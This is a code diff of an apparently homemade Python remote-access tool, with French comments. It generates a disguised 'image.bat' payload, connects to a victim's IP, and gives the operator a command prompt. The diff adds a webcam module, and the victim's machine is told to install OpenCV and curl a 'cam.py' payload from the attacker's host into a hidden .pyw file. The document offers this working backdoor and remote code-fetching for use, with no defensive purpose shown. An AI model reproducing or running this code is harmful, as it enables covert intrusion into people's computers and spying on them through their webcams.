@@ -33,11 +33,8 @@ if choix=="1":
     print(server_js_path)
     server_js = subprocess.Popen([NODE_PATH, server_js_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
-    #os.system("start /Min node servers/server.js")
     print("server ok")
-    # except:1
-    #     print("error server")
-    #     sys.exit()
+
     print("generation du payload...")
     generation_vecteur(HOST)
     print("payload enregistré sous le nom image.bat")
@@ -51,15 +48,15 @@ print("démarage de l'ecoute")
 ip_victime = read_victime_ip()
 
 try:
-    server_python.terminate()
     server_js.terminate()
 except:
     pass
 
 PORT = 55027
 mySocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-# mySocket.settimeout(5)
+
 print("Resverse lisening on ",ip_victime,"port ",PORT)
+
 while True:
     try:
         mySocket.connect((ip_victime, PORT))
@@ -71,13 +68,16 @@ time.sleep(1)
 while True:
     msg=input("C> ")
     if msg=="cam":
+
+        cam.gen_payload(HOST)
+
         msg="pip install opencv-python"
         mySocket.send(msg.encode("Utf8"))
         msgServeur = ""
         while msgServeur!='ex':
             msgServeur=mySocket.recv(len_msg).decode("Utf8")
         print("importation des modules ok")
-        msg="curl http://"+HOST+":8000/cam.py -o C:\\Users\\Public\\Documents\\cam.pyw"
+        msg="curl http://"+HOST+":8000/payload/cam.py -o C:\\Users\\Public\\Documents\\cam.pyw"
         mySocket.send(msg.encode("Utf8"))
         msgServeur = ""
         while msgServeur!='ex':
